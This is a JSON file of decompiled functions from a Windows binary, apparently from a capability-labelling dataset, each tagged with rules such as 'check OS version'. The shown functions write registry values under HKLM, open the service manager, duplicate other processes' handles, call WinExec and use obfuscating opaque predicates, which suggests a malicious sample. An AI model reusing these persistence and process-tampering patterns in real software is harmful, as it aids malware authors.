{
    "null": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401410": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401471) overlaps instruction at (ram,0x00401470)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00401410(char *arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t unaff_ESI;\n    uint32_t uVar5;\n    uint *puVar6;\n    char *pcVar7;\n    bool bVar8;\n    uchar var_264h;\n    uint var_263h;\n    uint uStack608;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar6 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    var_160h = '\\0';\n    puVar6 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    bVar8 = (POPCOUNT(arg_ch & 0xff) & 1U) != 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    uVar5 = arg_ch != 0;\n    if ((bVar8) && (!bVar8)) {\n        *(uVar5 + 0x3d8b0875) = *(uVar5 + 0x3d8b0875) | 8;\n        *(unaff_ESI + -0x73) = *(unaff_ESI + -0x73) + uStack608;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x40708c, arg_8h);\n    (*pcVar2)(&var_264h, 0x4070a4, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar7 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar7 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    bVar8 = SBORROW4(~uVar4, 1);\n    var_34h = 0x4070cc;\n    var_30h = 0x4070d8;\n    var_2ch = 0x4070e4;\n    var_28h = 0x4070f4;\n    var_24h = 0x4070fc;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((!bVar8) && (bVar8)) {\n        LOCK();\n    }\n    if (uVar5 < 5) {\n        uVar5 = uVar5 * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar5), *(&var_5ch + uVar5), *(&var_20h + uVar5), \n                              *(&var_48h + uVar5));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar5 = uVar5 + 4;\n        } while (uVar5 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1337
    },
    "00401b10": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401b8f) overlaps instruction at (ram,0x00401b8c)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401b10(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    uchar uVar11;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar2 = fcn.00403d00(0, arg_8h, arg_ch + 1U >> 1);\n    uVar8 = uVar2;\n    bVar10 = false;\n    uVar11 = 0;\n    if ((uVar8 != 0) && (uVar8 == 0)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar3 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    if ((bVar10) || (!bVar10)) {\n        uVar4 = *(iVar3 + 0x58);\n        uVar9 = uVar8;\n        var_4h = uVar4;\n    }\n    else {\n        uVar4 = func_0x10187ae4();\n        uVar11 = false;\n        uVar9 = uVar8 - 1;\n    }\n    if ((uVar11) || (!uVar11)) {\n        bVar10 = uVar9 < uVar4;\n    }\n    else {\n        uVar4 = CONCAT31(uVar4 >> 8, 0x98);\n        bVar10 = false;\n        LOCK();\n    }\n    if (bVar10) {\n        arg_8h = (uVar8 - var_4h & 0xffff) - 1;\n    }\n    else {\n        arg_8h = uVar9 - (uVar4 & 0xffff);\n    }\n    puVar6 = &stack0xfffffffc;\n    if (arg_8h < var_4h >> 0x10) {\n        arg_8h = (arg_8h - (var_4h >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        arg_8h = arg_8h - (var_4h >> 0x10);\n    }\n    puVar7 = puVar6;\n    if ((arg_8h != 0) && (arg_8h == 0)) {\n        puVar5 = &stack0xffffffe0;\n        puVar7 = &stack0xffffffe0;\n        cVar1 = '\\x10';\n        do {\n            puVar6 = puVar6 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar6;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    *puVar7[5] = arg_8h + puVar7[3];\n    *puVar7[4] = *(puVar7[-2] + 0x58);\n    return;\n}\n",
        "token_count": 765
    },
    "00401eb0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401eea) overlaps instruction at (ram,0x00401ee1)\n// \n\nuint fcn.00401eb0(void)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    uint uVar3;\n    char unaff_BL;\n    uint *unaff_ESI;\n    char cVar4;\n    uint lpVersionInformation;\n    uint32_t var_90h;\n    int32_t var_8ch;\n    \n    cVar4 = &stack0xfffffffc < 0x94;\n    lpVersionInformation = 0x94;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if ((cVar4) || (!cVar4)) {\n        cVar4 = var_90h < 5;\n        if (var_90h != 5) {\n            if ((var_90h == 6) && (var_8ch == 0)) {\n                return 1;\n            }\n            return 0;\n        }\n        iVar1 = 1;\n        unaff_ESI = &lpVersionInformation;\n    }\n    *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x8327e95e;\n    pcVar2 = iVar1 + (cVar4 == '\\0') + 0x7e46d582;\n    *pcVar2 = *pcVar2 + pcVar2;\n    *(unaff_ESI + -0x75) = *(unaff_ESI + -0x75) + unaff_BL;\n    uVar3 = in(0x5d);\n    return uVar3;\n}\n",
        "token_count": 375
    },
    "00402490": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004024b4) overlaps instruction at (ram,0x004024b3)\n// \n\nbool fcn.00402490(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t unaff_EBX;\n    uchar *puVar2;\n    uint *unaff_ESI;\n    uint *puVar3;\n    uint *puVar4;\n    uint *puStack40;\n    \n    puStack40 = param_1;\n    iVar1 = (*_sym.imp.MSVCRT.dll__strlwr)();\n    puVar2 = &stack0xfffffffc;\n    if ((!SCARRY4(&puStack40, 4)) && (puVar2 = &stack0xfffffffc,  SCARRY4(&puStack40, 4))) {\n        puVar4 = param_1 + 1;\n        puVar3 = unaff_ESI + 1;\n        *param_1 = *unaff_ESI;\n        if (iVar1 == -1) goto code_r0x004024fa;\n        LOCK();\n        puVar2 = &stack0xfffffffd;\n        param_1 = puVar4;\n    }\n    *(puVar2 + -0xc) = 0x407448;\n    *(puVar2 + -8) = 0x407450;\n    *(puVar2 + -4) = 0x407458;\n    unaff_EBX = 0;\n    puVar3 = puVar2 + -0x14;\n    puVar4 = param_1;\n    do {\n        puStack40 = *puVar3;\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(puVar4);\n        if (iVar1 != 0) {\n            return true;\n        }\n        unaff_EBX = unaff_EBX + 1;\ncode_r0x004024fa:\n        puVar3 = puVar3 + 1;\n    } while (unaff_EBX < 5);\n    puStack40 = 0x407430;\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(puVar4);\n    return iVar1 == 0;\n}\n",
        "token_count": 471
    },
    "00403970": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004039d3) overlaps instruction at (ram,0x004039ce)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00403970(uint param_1, int32_t param_2)\n\n{\n    uint hSCManager;\n    int32_t iVar1;\n    uint uVar2;\n    uint8_t extraout_CL;\n    char extraout_CH;\n    bool bVar3;\n    char cVar4;\n    char cVar5;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    cVar5 = SBORROW1(extraout_CH + -1, '\\x05');\n    cVar4 = extraout_CH + -6 < '\\0';\n    bVar3 = extraout_CH + -1 == '\\x05';\n    iVar1 = fcn.00404a30(hSCManager, param_1);\n    if ((bVar3 || cVar5 != cVar4) || (!bVar3 && cVar5 == cVar4)) {\n        iVar1 = param_2;\n    }\n    *(iVar1 + -0x74c625aa) = *(iVar1 + -0x74c625aa) ^ extraout_CL;\n    uVar2 = fcn.00403c90(hSCManager, param_1);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar2;\n}\n",
        "token_count": 322
    },
    "004042a0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004044bb) overlaps instruction at (ram,0x004044ba)\n// \n// WARNING: Removing unreachable block (ram,0x004044bb)\n// WARNING: Removing unreachable block (ram,0x004042e7)\n// WARNING: Removing unreachable block (ram,0x004042f0)\n// WARNING: Removing unreachable block (ram,0x004042f4)\n\nuint32_t __cdecl fcn.004042a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    int32_t iVar5;\n    uint8_t *unaff_EBX;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint uVar9;\n    bool bVar10;\n    uint in_stack_fffffdb0;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar8 = &var_213h;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    s = 0;\n    puVar8 = &var_10fh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    var_ch = 1;\n    *(puVar8 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    uVar6 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    fcn.004048a0(uVar6 - 4, uVar6 - 8);\n    iVar5 = fcn.004015a0(*(uVar6 + 8), *(uVar6 + 0xc), *(uVar6 + 0x10), *(uVar6 + 0x14), *(uVar6 - 4), *(uVar6 - 8));\n    if (iVar5 == 0) {\n        return 0;\n    }\n    iVar5 = fcn.00403b10(uVar6 - 0x110, *(uVar6 - 4), *(uVar6 - 8));\n    bVar10 = iVar5 == 0;\n    if (bVar10) {\n        return 0;\n    }\n    if ((!bVar10) && (bVar10)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    bVar10 = false;\n    fcn.00401880();\n    if ((!bVar10) && (bVar10)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar5 = fcn.00404930(0x407068);\n    if ((iVar5 == -1) && (iVar5 = fcn.00404930(0x40705c),  iVar5 == -1)) {\n        uVar9 = *(uVar6 + 8);\n    }\n    else {\n        uVar9 = *(uVar6 + 8);\n        iVar5 = fcn.004040a0(uVar9);\n        if (iVar5 != 0) {\n            fcn.00401c70();\n            fcn.004022e0();\n            return 1;\n        }\n        if (*0x424738 == 0) {\n            return 0;\n        }\n    }\n    uVar3 = fcn.00403970();\n    if (uVar3 == 0) {\n        uVar7 = 0;\n    }\n    else {\n        uVar7 = *(uVar6 - 0xc);\n    }\n    if (((uVar3 < 0x80000000) && (uVar3 >= 0x80000000)) || (bVar10 = uVar7 == 0,  in_stack_fffffdb0 = uVar9,  !bVar10))\n    {\n        uVar7 = uVar3 + 0xe40ce22a;\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        uVar3 = fcn.00404de0(in_stack_fffffdb0);\n        bVar10 = uVar3 == 0;\n        if (bVar10) {\n            *(uVar6 - 0xc) = 0;\n            uVar7 = uVar3;\n        }\n    }\n    if ((!bVar10) && (bVar10)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (uVar7 == 0) {\n        uVar3 = fcn.00401410(uVar9, 0);\n        *(uVar6 - 0xc) = uVar3;\n        uVar7 = uVar3;\n    }\n    uVar2 = uVar3;\n    if (uVar7 != 0) {\n        uVar2 = fcn.004022e0(0xffffffff);\n    }\n    bVar10 = (uVar2 ^ unaff_EBX) < 0;\n    iVar5 = (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    if ((bVar10) || (!bVar10)) {\n        (*_sym.imp.KERNEL32.dll_WinExec)(0x40707c, 0);\n    }\n    else if (SCARRY4(iVar5, 0x7c68006a)) {\n        fcn.00401930();\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(uVar6 - 0x10c, 0x104);\n        *(uVar6 - 4) = 0;\n        do {\n            uVar4 = fcn.00404db0();\n            arg_ch_00 = fcn.00404db0();\n            arg_ch_01 = fcn.00404db0();\n            uVar9 = *(uVar6 + 0x10);\n            fcn.00403a00(uVar9, uVar4);\n            uVar4 = *(uVar6 + 8);\n            fcn.00403a00(uVar4, arg_ch_00);\n            fcn.00403a00(*(uVar6 + 0xc), arg_ch_01);\n            pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n            (*_sym.imp.MSVCRT.dll_sprintf)(uVar6 - 0x314, 0x407024, uVar6 - 0x10c, uVar9);\n            iVar5 = fcn.00404260(uVar6 - 0x314);\n            if (iVar5 != 0) {\n                (*pcVar1)(uVar6 - 0x210, 0x407030, uVar6 - 0x10c, uVar4);\n                iVar5 = fcn.00404260(uVar6 - 0x210);\n                if (iVar5 != 0) {\n                    (*pcVar1)(uVar6 - 0x210, 0x407030, uVar6 - 0x10c, *(uVar6 + 0xc));\n                    iVar5 = fcn.00404260(uVar6 - 0x210);\n                    if (iVar5 != 0) {\n                        iVar5 = 1;\n                        goto code_r0x004046c8;\n                    }\n                }\n            }\n            iVar5 = *(uVar6 - 4) + 1;\n            *(uVar6 - 4) = iVar5;\n        } while (iVar5 < 3);\n        iVar5 = *(uVar6 - 8);\ncode_r0x004046c8:\n        fcn.00403a00(*(uVar6 + 0x14), 4);\n        return iVar5 != 0;\n    }\n    return uVar7;\n}\n",
        "token_count": 1869
    },
    "00401230": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004012fd) overlaps instruction at (ram,0x004012fc)\n// \n\nvoid fcn.00401230(uint param_1, uint32_t param_2, uint param_3, uint param_4, uint *param_5, uint *param_6, \n                 uint *param_7)\n\n{\n    uint8_t *puVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uchar *puVar7;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    bool bVar8;\n    char cVar9;\n    char cVar10;\n    float10 in_ST0;\n    ulong uVar11;\n    uchar auStack272 [268];\n    \n    puVar7 = &stack0xfffffffc;\n    bVar8 = &stack0xfffffffc < 0x10c;\n    cVar10 = SBORROW4(&stack0xfffffffc, 0x10c);\n    cVar9 = auStack272 < 0;\n    if ((!cVar9) && (cVar9)) {\n        puVar2 = unaff_EDI + 4;\n        puVar1 = unaff_ESI + 4;\n        *(unaff_EDI + 0x1c) = in_ST0;\n        bVar8 = *puVar1 < *puVar2;\n        cVar10 = SBORROW1(*puVar1, *puVar2);\n        cVar9 = *puVar1 - *puVar2 < '\\0';\n    }\n    uVar11 = fcn.00401750();\n    puVar6 = uVar11 >> 0x20;\n    if (bVar8) {\ncode_r0x00401280:\n        puVar6 = param_7 + 0x18;\n    }\n    else {\n        if (!bVar8) goto code_r0x00401280;\n        uVar3 = uVar11 + 0x7c8ecb0d + (bVar8 == false);\n        *(param_7 + 0x43d1773a) = *(param_7 + 0x43d1773a) ^ 0x8b27e95e;\n        puVar7 = &stack0xfffffffd;\n        cVar10 = '\\0';\n        param_2 = uVar3 | 0x8d;\n        cVar9 = (uVar3 | 0x8d) < '\\0';\n    }\n    uVar4 = fcn.00401750(param_5, param_6, param_2, 0x20, puVar6);\n    if (cVar10 == cVar9) {\n        puVar6 = param_5;\n        if (cVar10 == cVar9) goto code_r0x0040129c;\n    }\n    else {\ncode_r0x0040129c:\n        puVar6 = param_7 + 0x28;\n    }\n    fcn.00401750(param_5, param_6, uVar4, 0x20, puVar6);\n    iVar5 = fcn.00401750();\n    if ((SCARRY4(&stack0xfffffeb0, 0x14)) || (!SCARRY4(&stack0xfffffeb0, 0x14))) {\n        iVar5 = func_0x004011e0();\n        if (iVar5 == -1) {\n            iVar5 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(param_7 + 0x48) = iVar5 % 5;\n            goto code_r0x00401323;\n        }\n    }\n    else {\n        iVar5 = iVar5 + 1;\n        *param_6 = *param_7;\n        param_5[0x21d3ffe] = param_5[0x21d3ffe] + 1;\n        param_7 = param_7 + 1;\n    }\n    *(param_7 + 0x48) = iVar5;\ncode_r0x00401323:\n    puVar7[-0x10c] = 0;\n    puVar6 = puVar7 + -0x10b;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar7 + -4) = 0x104;\n    *(puVar6 + 2) = 0;\n    iVar5 = fcn.004022f0(0x80000001, 0x407258, 0x407284, puVar7 + -8, puVar7 + -0x10c, puVar7 + -4);\n    if (iVar5 != 0) {\n        iVar5 = (*_sym.imp.MSVCRT.dll__stricmp)();\n        if (iVar5 == 0) {\n            *(*(puVar7 + 0x20) + 0x120) = *(*(puVar7 + 0x20) + 0x120) | 0x80;\n        }\n    }\n    return;\n}\n",
        "token_count": 1159
    },
    "00401980": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401a05) overlaps instruction at (ram,0x00401a00)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00401980(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uint8_t extraout_CL;\n    uint *puVar4;\n    uint *puVar5;\n    bool bVar6;\n    char cVar7;\n    char cVar8;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    uint uStack8;\n    \n    puVar5 = &stack0xfffffffc;\n    bVar6 = (POPCOUNT(&var_80h & 0xff) & 1U) != 0;\n    if ((bVar6) && (!bVar6)) {\n        puVar4 = &stack0xffffff6c;\n        cVar7 = '\\x1e';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar4 = puVar4 + -1;\n            *puVar4 = *puVar5;\n            cVar7 = cVar7 + -1;\n        } while ('\\0' < cVar7);\n        uVar1 = in(0x78);\n        return uVar1;\n    }\n    iVar2 = fcn.00401eb0();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    fcn.00403da0();\n    iVar2 = fcn.00404930(0x407074);\n    cVar8 = SBORROW4(iVar2, -1);\n    cVar7 = iVar2 + 1 < 0;\n    bVar6 = iVar2 == -1;\n    if (!bVar6) {\n        return 0;\n    }\n    pcVar3 = fcn.00403330();\n    *0x42473c = 1;\n    if ((bVar6 || cVar8 != cVar7) || (!bVar6 && cVar8 == cVar7)) {\n        pcVar3 = fcn.00401fc0();\n    }\n    else {\n        pcVar3[-0x17c625aa] = pcVar3[-0x17c625aa] ^ extraout_CL;\n        *pcVar3 = *pcVar3 + pcVar3;\n    }\n    if (pcVar3 != NULL) {\n        return 0;\n    }\n    var_20h = 0;\n    var_80h._0_1_ = 0;\n    puVar5 = &var_1fh;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_60h._0_1_ = 0;\n    puVar5 = &var_80h + 1;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_40h._0_1_ = 0;\n    puVar5 = &var_60h + 1;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puVar5 = &var_40h + 1;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    iVar2 = fcn.00404580(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar2 = fcn.00402000(&var_20h);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar2 = fcn.004042a0(&var_80h, &var_60h, &var_20h, &var_40h);\n    return iVar2 != 0;\n}\n",
        "token_count": 1068
    },
    "00401f30": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f92) overlaps instruction at (ram,0x00401f91)\n// \n\nbool __fastcall fcn.00401f30(uint param_1, ushort param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uchar *unaff_ESI;\n    bool bVar3;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    if ((*0x10 != 0x110) && (*0x10 == 0x110)) {\n        out(*unaff_ESI, param_2);\n    }\n    puVar1 = fcn.004022f0(0x80000002, 0x4072f0, 0x407330, &var_8h, &var_10ch, &var_4h);\n    bVar3 = (POPCOUNT(puVar1 & 0xff) & 1U) == 0;\n    if (puVar1 == NULL) {\n        return false;\n    }\n    if ((bVar3) || (!bVar3)) {\n        puVar1 = &var_10ch;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll__access)(puVar1, 0);\n    return iVar2 != -1;\n}\n",
        "token_count": 304
    },
    "00401fc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401fe2) overlaps instruction at (ram,0x00401fe1)\n// \n\nuint fcn.00401fc0(void)\n\n{\n    int32_t iVar1;\n    uint8_t *unaff_EBX;\n    bool bVar2;\n    \n    iVar1 = fcn.004013e0(0x407010);\n    bVar2 = iVar1 + 1 < 0;\n    if (iVar1 != -1) {\n        if ((bVar2) || (!bVar2)) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        }\n        else {\n            *unaff_EBX = *unaff_EBX & 0xc3;\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 174
    },
    "00403a70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403a83) overlaps instruction at (ram,0x00403a81)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __cdecl fcn.00403a70(uint arg_8h)\n\n{\n    char unaff_00023900;\n    uchar *unaff_00023b00;\n    char cVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t in_ECX;\n    ushort unaff_BX;\n    uint *puVar5;\n    uint *puVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    uchar *puVar9;\n    bool in_SF;\n    uint32_t auStackY50339 [12579];\n    uint uStackY20;\n    \n    puVar5 = &stack0xfffffffc;\n    if ((in_SF) || (!in_SF)) {\n        uStackY20 = 0x403a8d;\n        uVar2 = fcn.00404930(0x40707c);\n        in_ECX = uVar2;\n    }\n    else {\n        uVar2 = in_EAX + 0x40707c68U & 0xffffff00 | in_EAX + 0x40707c68U + (in_ECX >> 8);\n        unaff_00023900 = '\\x04';\n        unaff_00023b00 = &stack0xfffffff0;\n        puVar6 = &stack0xfffffff0;\n        cVar1 = '\\x03';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar6 = puVar6 + -1;\n            *puVar6 = *puVar5;\n            cVar1 = cVar1 + -1;\n            *0x8b00000e = uVar2;\n        } while ('\\0' < cVar1);\n    }\n    iVar4 = (unaff_00023900 - 1) * -4;\n    *(&stack0xfffffff0 + iVar4) = unaff_00023b00;\n    if (in_ECX == 0xffffffff) {\n        return 0;\n    }\n    *(&stack0xffff3b69 + iVar4) = uVar2;\n    *(&stack0xffff3b69 + iVar4) = in_ECX;\n    *(&stack0xffff3b65 + iVar4) = 0;\n    *(&stack0xffff3b61 + iVar4) = 0x40;\n    puVar7 = &stack0xffff3b5d + iVar4;\n    *(&stack0xffff3b5d + iVar4) = 0x403aae;\n    uVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (uVar2 == 0) {\n        return 0;\n    }\n    if (0 < uVar2) {\n        *(puVar7 + -2) = uVar2;\n        uVar2 = uVar2 & 0xffff0000 | *(puVar7 + -2);\n    }\n    uVar3 = *(unaff_00023b00 + 8);\n    *(puVar7 + -4) = 2;\n    *(puVar7 + -8) = 0;\n    *(puVar7 + -0xc) = 0;\n    *(puVar7 + -0x10) = 0;\n    *(puVar7 + -0x14) = uVar2;\n    *(puVar7 + -0x18) = uVar3;\n    puVar8 = puVar7 + -0x1c;\n    *(puVar7 + -0x1c) = 0x403ad7;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    *(puVar8 + -4) = uVar3;\n    puVar9 = puVar8 + -8;\n    *(puVar8 + -8) = 0x403ade;\n    iVar4 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)();\n    if (iVar4 == 0) {\n        return 0;\n    }\n    *(puVar9 + -4) = iVar4;\n    *(puVar9 + -6) = unaff_BX;\n    *(puVar9 + -4) = uVar2;\n    *(puVar9 + -8) = 0x403b05;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    return 1;\n}\n",
        "token_count": 991
    },
    "00403b10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
